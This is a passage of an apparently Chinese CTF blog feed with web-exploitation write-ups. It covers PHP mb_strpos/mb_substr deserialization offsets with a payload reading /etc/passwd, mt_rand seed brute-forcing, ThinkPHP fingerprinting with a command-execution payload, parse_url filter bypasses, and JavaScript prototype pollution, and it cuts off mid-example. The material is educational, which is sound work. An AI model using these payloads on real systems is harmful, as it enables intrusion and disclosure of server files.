class="line">每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节</span><br><span class="line">每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节</span><br><span class="line">每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function substrstr($data)</span><br><span class="line">&#123;</span><br><span class="line">    $start = mb_strpos($data, &quot;[&quot;);</span><br><span class="line">    $end = mb_strpos($data, &quot;]&quot;);</span><br><span class="line">    return mb_substr($data, $start + 1, $end - 1 - $start);</span><br><span class="line">&#125;</span><br><span class="line">class read_file&#123;</span><br><span class="line">    public $start;</span><br><span class="line">    public $filename=&quot;/etc/passwd&quot;;</span><br><span class="line">    public function __construct($start)&#123;</span><br><span class="line">        $this-&gt;start=$start;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;start == &quot;gxngxngxn&quot;)&#123;</span><br><span class="line">           echo &#x27;What you are reading is:&#x27;.file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;start&#x27;]))&#123;</span><br><span class="line">    $readfile = new read_file($_GET[&#x27;start&#x27;]);</span><br><span class="line">    $read=isset($_GET[&#x27;read&#x27;])?$_GET[&#x27;read&#x27;]:&quot;I_want_to_Read_flag&quot;;</span><br><span class="line">    if(preg_match(&quot;/\[|\]/i&quot;, $_GET[&#x27;read&#x27;]))&#123;</span><br><span class="line">        die(&quot;NONONO!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $ctf = substrstr($read.&quot;[&quot;.serialize($readfile).&quot;]&quot;);</span><br><span class="line">    unserialize($ctf);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;Start_Funny_CTF!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>审计上述代码，发现传入参数start和read，会拼接read和realfile的序列化。</p><p>根据代码知道，在调用函数截取的时候是以 “[” 开始的，但是read里面又不能有 “[”，所以一定只能截取[]内的序列化。但是只有变量start是可控的，其它不可控，看似无解，但可利用上述的漏洞，让其发生错位索引，从而执行我们自己传入的序列化列表。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果start=gxngxngxn，序列化为：</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span><br><span class="line"></span><br><span class="line">如果我们自己构造一个序列化表传入，start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br><span class="line">序列化结果为：</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;&quot;;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span><br><span class="line"></span><br><span class="line">相比较，前面多了一串：</span><br><span class="line">O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:126:&quot;</span><br><span class="line">刚好多了38个字符，就可以通过传参read来利用上述漏洞，让他们错位38个索引</span><br></pre></td></tr></table></figure><blockquote><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?read=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa&amp;start=O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:55:&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>接下来分析一下，传进去后，在传入截取函数前，它们会组合成：</p><p>%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9f%9fa%f0%9f%9fa[O:9:“read_file”:2:{s:5:“start”;s:126:“O:9:“read_file”:2:{s:5:“start”;s:9:“gxngxngxn”;s:8:“filename”;s:55:“php://filter/convert.base64-encode/resource=/etc/passwd”;}”;s:8:“filename”;s:11:“/etc/passwd”;}]</p><p>根据上述漏洞，mb_strpos索引&quot;[“时，会索引到 12x4+2x2+1-1 = 52，即”[&quot;下标是52</p><p>mb_substr在截取时，就会从下标为53的截取。 53=12x1+1x2+1+38+1-1，刚好绕过了前面的38个字符串，从而反序列化我们自己传入的序列化表。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机数种子爆破</title>
      <link href="/posts/b4b5a295.html"/>
      <url>/posts/b4b5a295.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165931510.png" alt="image-20241116165931510"></p><p>在PHP中，变量以$符号开头，后面拼接变量名。上述代码的基本 含义是:从$str变量中随机取32次字符(字符可重复)，并拼接成字符 串，最后将该字符串赋值给变量$password。执行代码后会输出 $password变量的前10个字节，此时通过POST请求传递password参数到 服务端，如果password参数的值与$password变量的值完全相等，那么 就会输出flag。</p><p>理论上，如果选取字符的时候是完全随机的，那么几乎不可能出现 password参数值与$password变量值相等的情况(概率极低)。但由于 代码中使用mt_rand()函数来生成随机数，因此如果可以得知该函数生 成的一段随机数序列，就可以通过工具爆破出其选取的随机数种子 (该种子由$_Session[‘seed’]变量生成)，从而预测之后的所有随机数序 列。在这里，我们使用php_mt_seed工具来爆破随机数种子。该工具的 下载地址为:<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-">https://www.openwall.com/php_mt_seed/php_mt_seed-</a> 4.0.tar.gz</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165647076.png" alt="image-20241116165647076"></p><p>访问题目页面，可得到前10个字节的随机字符，将输出的随机字符转换为php_mt_seed可识别的数据格式。使用</p><p>Python3脚本进行转换:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165703575.png" alt="image-20241116165703575"></p><p>str1变量的值就是PHP代码中的$str的值，str2变量的值就是PHP代码中 输出的$password的前10个字节。这段代码的基本作用就是将$password 中的前10个字节(即变量str2)进行定位，得到其在str1中的具体下标 位置，然后按照具体格式输出。以str2中的第一个字母A为例，字母A 在变量str1中的下标是36(字符串下标从0开始)</p><p>将输出的字符输入到编译好的php_mt_seed工具中，具体指令如下:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165734372.png" alt="image-20241116165734372"></p><p>最终我们找到一个随机数种子 19290735(PHP7.1)。在这一步需要注意的是，mt_rand()函数本身确 实存在问题，但是根据PHP版本的不同，其生成的随机数会略有区别。 所以，在实际题目中一定要注意PHP版本问题，不能脱离PHP版本来做 题。</p><p>利用得到的随机数种子编写PHP脚本，如下所示:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165751773.png" alt="image-20241116165751773"></p><p>尝试将该结果提交给服务端，即可成功得到flag。</p><p>本质上是因为mt_rand()函数的不安全性导致的。所以，我们需要明确 以下几点:</p><ol><li>mt_rand()函数的不安全性是考点的核心。</li></ol><p>2)要爆破随机数种子，首先需要得到mt_rand()函数生成的随机数序</p><p>列。</p><p>3)mt_rand()函数生成的随机数序列可能以不同的形式表现(例如生成 随机字符串)。</p><p>4)相同函数在不同的PHP版本(大版本)中的实现代码可能是不一样 的。例如，在PHP7和PHP5中，mt_rand()函数的实现算法是完全不同 的。</p><p>5)计算机中不存在真正的随机数，这是mt_rand()函数存在安全问题的 根本原因。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tp漏洞</title>
      <link href="/posts/3b315222.html"/>
      <url>/posts/3b315222.html</url>
      
        <content type="html"><![CDATA[<h2 id="一-识别tp框架-指纹">一-识别tp框架(指纹)</h2><h3 id="1-1-ioc判断">1.1 ioc判断</h3><p>/favicon.ico</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20516b1e8de85b6b95343771b66b44df.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125193711067.png" alt="image-20241125193711067"></p><h3 id="1-2报错">1.2报错</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1c8c509ef3f760f24376d38f6a7625c8.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3b4ccc2eacbbf6163c0ef584d7aeb544.png" alt="img"></p><p>或者 /index.php/index/index/1</p><h3 id="1-3错误传参">1.3错误传参</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/479046ae0c8bf91e2d32d17acc474db9.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebf2fd7c4ce6bf62b49083a7085bd599.png" alt="img"></p><h3 id="1-4特殊指纹出现logo">1.4特殊指纹出现logo</h3><p>/?c=4e5e5d7364f443e28fbf0d3ae744a59a</p><p>/4e5e5d7364f443e28fbf0d3ae744a59a</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3ddc4ccf08674da045f360091d24546e.png" alt="img"></p><p>p3.1和3.2版本</p><p>4e5e5d7364f443e28fbf0d3ae744a59a-index.html</p><h3 id="1-5-body特征">1.5 body特征</h3><p>body里有&quot;十年磨一剑&quot; 或者&quot;ThinkPHP&quot;</p><h3 id="1-6插件">1.6插件</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0684f3dbf50af3128a16c0a775d03eb4.png" alt="img"></p><h2 id="二、利用方法">二、利用方法</h2><p>数据通过竖线分开, 前面为参数, 后面为函数。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cacheTime=0&amp;isCache=ls|system  </span><br><span class="line">/index.php/?cacheTime=0&amp;isCache=ls|system   #上面不行就换下面</span><br></pre></td></tr></table></figure><p>根据 thinkphp 的路由规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于ThinkPHP存在两种路由规则，如下所示</span><br><span class="line">http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line">http://serverName/index.php?s=/模块/控制器/操作/[参数名/参数值...]</span><br><span class="line">也可采用 index.php/a/b/c/$&#123;code&#125;一下形式。</span><br></pre></td></tr></table></figure><p>访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里。</p><p>所以一般要先加上路由路径。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>parse_url函数</title>
      <link href="/posts/f885edb3.html"/>
      <url>/posts/f885edb3.html</url>
      
        <content type="html"><![CDATA[<p>parse_url函数<br>作用：parse_url — 解析 URL，返回其组成部分</p><p>mixed parse_url ( string $url [, int $component = -1 ] )<br>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p><p>参数：<br>url：要解析的 URL。无效字符将使用 _ 来替换。</p><p>component：<br>指定 PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、PHP_URL_QUERY 或 PHP_URL_FRAGMENT 的其中一个来获取 URL 中指定的部分的 string。 （除了指定为PHP_URL_PORT 后，将返回一个 integer 的值）。</p><p>对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DEMO</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里我们还输出了当前$url的PHP_URL_PATH 发现是 /path<br>那么如果我们这里把$url中的/path去掉 发现输出的则为 NULL</p><p>tips：parse_url()会把//认为是相对路径（5.4.7以前）<br>如果我们</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;//www.example.com/path?googleguy=googley&#x27;;</span><br><span class="line"> </span><br><span class="line">// 在 5.4.7 之前这会输出路径 &quot;//www.example.com/path&quot;</span><br><span class="line">var_dump(parse_url($url));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="2016asisctf的一道web题-DEMO1">2016asisctf的一道web题 DEMO1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$data = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]); </span><br><span class="line">var_dump($data);</span><br><span class="line">$filter=array(&quot;aaa&quot;,&quot;qqqq&quot;);</span><br><span class="line">foreach($filter as $f)</span><br><span class="line">&#123; </span><br><span class="line">if(preg_match(&quot;/&quot;.$f.&quot;/i&quot;, $data[&#x27;query&#x27;]))</span><br><span class="line">&#123; </span><br><span class="line">die(&quot;Attack Detected&quot;); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8493b71d2534228680bc92134d48817d.png" alt="img"></p><p>这里query中的参数有aaa 被preg_match匹配到 所以拦截了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/260d79001d32b5306fb9f046839ee920.png" alt="img"></p><p>这里test.php前面加了一个/ 导致把test.php? 认为成了host 相对的来说 /aaa/xxx 也就成为了路径 这也可以说是一个绕过吧</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a6c48f242ca38058c92a1bc195e6c365.png" alt="img"></p><p>这里test.php前面再多加了一个/ 导致 严重不合格的 URL，parse_url() 返回FALSE 这个是通用的绕过方法</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解 JavaScript Prototype 污染攻击</title>
      <link href="/posts/575ed4b2.html"/>
      <url>/posts/575ed4b2.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、prototype和-proto-分别是什么？">1、<code>prototype</code>和<code>__proto__</code>分别是什么？</h2><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new Foo()</span><br></pre></td></tr></table></figure><p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p><blockquote><p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p></blockquote><p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">    this.show = function() &#123;</span><br><span class="line">        console.log(this.bar)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(new Foo()).show()</span><br></pre></td></tr></table></figure><p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p><p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = function show() &#123;</span><br><span class="line">    console.log(this.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let foo = new Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></a></p><p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ == Foo.prototype</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p><p>所以，总结一下：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h2 id="0x02-JavaScript原型链继承"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">0x02 JavaScript原型链继承</a></h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Father() &#123;</span><br><span class="line">    this.first_name = &#x27;Donald&#x27;</span><br><span class="line">    this.last_name = &#x27;Trump&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Son() &#123;</span><br><span class="line">    this.first_name = &#x27;Melania&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = new Father()</span><br><span class="line"></span><br><span class="line">let son = new Son()</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p><p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><h2 id="0x03-原型链污染是什么"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03">0x03 原型链污染是什么</a></h2><p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p><p>做个简单的实验：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// foo是一个简单的JavaScript对象</span><br><span class="line">let foo = &#123;bar: 1&#125;</span><br><span class="line"></span><br><span class="line">// foo.bar 此时为1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 修改foo的原型（即Object）</span><br><span class="line">foo.__proto__.bar = 2</span><br><span class="line"></span><br><span class="line">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 此时再用Object创建一个空的zoo对象</span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line">// 查看zoo.bar</span><br><span class="line">console.log(zoo.bar)</span><br></pre></td></tr></table></figure><p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p><p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="0x04-哪些情况下原型链会被污染？"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x04">0x04 哪些情况下原型链会被污染？</a></h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们用如下代码实验一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure><p>结果是，合并虽然成功了，但原型链没有被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, 